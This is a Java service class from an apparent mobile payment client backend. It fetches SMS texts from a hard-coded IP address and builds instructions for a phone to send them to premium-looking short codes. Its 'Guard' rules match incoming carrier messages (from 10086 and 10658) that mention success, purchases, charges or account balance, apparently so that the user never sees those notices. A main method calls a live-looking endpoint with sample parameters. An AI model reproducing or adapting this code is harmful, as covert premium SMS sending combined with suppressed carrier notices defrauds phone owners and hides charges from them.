package com.jxt.pay.appclient.service.dynamic.net;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Calendar;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.Properties;

import org.apache.log4j.Logger;

import com.jxt.pay.appclient.service.dynamic.pojo.Guard;
import com.jxt.pay.appclient.service.dynamic.pojo.Sms;
import com.jxt.pay.appclient.service.dynamic.utils.XstreamHelper;
import com.jxt.pay.appclient.utils.CommonUtil;
import com.jxt.pay.appclient.utils.DynamicUtils;
import com.jxt.pay.appclient.utils.GetData;

public class TsxzDynamicService implements IDynamicService{

	private static Logger logger = Logger.getLogger(TsxzDynamicService.class); 
	
	private static final String TYPE = "tsxz";
	
	private static final String REQUESTMODEL = "c={c}&s={s}&b={b}";
	private int timeOut = 60;
	private static final String DEST1 = "10658422";
	private static final String DEST2 = "1065889923";
	private static final Guard guard1 = new Guard("10658","成功|购买|话费",2880,"1",0);
	private static final Guard guard2 = new Guard("10086","点数|帐户|充值|花费",2880,null,1);
	private static final Guard guard3 = new Guard("10658","",960,null,1);
	private static final Guard guard4 = new Guard("10086","",960,null,1);
	
	private static final Integer DEFAULTSUCCESSTIMEOUT = 2;
	
	@Override
	public String getType() {
		return TYPE;
	}

	private Map<String, Long> tryMap = new HashMap<String, Long>();
	
	@Override
	public String dynamic(Map<String, String> map) {
		
		String xml = null;
		String url = map.get("url");
		
		if(url != null && url.length() > 0){
			String channel = map.get("channel");
			
			Calendar cal = Calendar.getInstance();
			Long startTime = tryMap.get(channel);
			
			if(startTime == null){
				startTime = cal.getTimeInMillis();
				tryMap.put(channel,startTime);
			}else{
				if(cal.getTimeInMillis() - startTime >= 1000 * timeOut){
					tryMap.remove(channel);
					return DynamicUtils.parseError("599");
				}
			}
			
			String c = map.get("c");
			String s = map.get("s");
			String b = map.get("b");
			
			String param = REQUESTMODEL.replace("{c}",c).replace("{s}",s).replace("{b}",b);
			
			String responseTxt = GetData.getData(url, param);
			
			xml = parseTxt(responseTxt);

			if(xml == null || xml.length() == 0){
				xml = DynamicUtils.parseWait(7,map);
			}else{
				tryMap.remove(channel);
			}
		}
		
		return xml;
	}
	
	private String parseTxt(String responseTxt){
		
		if(responseTxt != null && responseTxt.length() > 0){
			
			logger.info("responseTxt : "+responseTxt);
			
			Properties prop = CommonUtil.getProp(responseTxt);
			
			String registSMS = prop.getProperty("loginSms");
			String chargeSMS = prop.getProperty("paySms");
			
			if(registSMS != null && registSMS.length() > 0 && chargeSMS != null && chargeSMS.length() > 0){
				Sms sms = new Sms();
				
				sms.setSmsContent(registSMS);
				sms.setSmsDest(DEST1);
				sms.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
				
				Sms sms1 = new Sms();
				
				sms1.setSmsContent(chargeSMS);
				sms1.setSmsDest(DEST2);
				sms1.setSuccessTimeOut(DEFAULTSUCCESSTIMEOUT);
				
				Sms guardSms = new Sms();
				
				List<Guard> guardList = new ArrayList<Guard>();
				
				guardList.add(guard1);
				guardList.add(guard2);
				
				guardList.add(guard3);
				guardList.add(guard4);
				
				guardSms.setGuardList(guardList);
				
				StringBuffer sb = new StringBuffer();
				
				sb.append(XstreamHelper.toXml(guardSms));
				sb.append(XstreamHelper.toXml(sms));
				sb.append("<wait>10</wait>");
				sb.append(XstreamHelper.toXml(sms1));
				
				return sb.toString();
			}
		}
		
		return null;
	}
	
	public static void main(String[] args){
		//http://42.121.107.174:8384/?c=701090&s=760000018341&b=40110728228.001
		
		Map<String, String> map = new HashMap<String, String>();
		
		map.put("url","http://42.121.107.174:8384/");
		map.put("channel","10B101a087654322");
		map.put("c","701090");
		map.put("s","760000018341");
		map.put("b","40110728228.003");
		
		System.out.println(new TsxzDynamicService().dynamic(map));
		
	}

}
